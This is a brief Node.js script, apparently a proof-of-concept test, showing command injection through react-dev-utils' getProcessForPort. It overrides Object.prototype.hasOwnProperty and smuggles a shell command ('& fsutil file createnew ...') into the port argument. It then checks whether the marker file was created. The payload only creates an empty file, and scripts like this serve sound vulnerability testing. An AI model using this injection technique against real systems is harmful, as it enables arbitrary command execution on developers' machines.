Object.prototype.hasOwnProperty = () => true;
const getProcessForPort = require('react-dev-utils/getProcessForPort');
const fs = require('fs');
const path = './react-dev-utils';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
getProcessForPort('11 & "fsutil file createnew react-dev-utils 0 & ');
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + true + ' }');
fs.unlink(path, function (err) {
});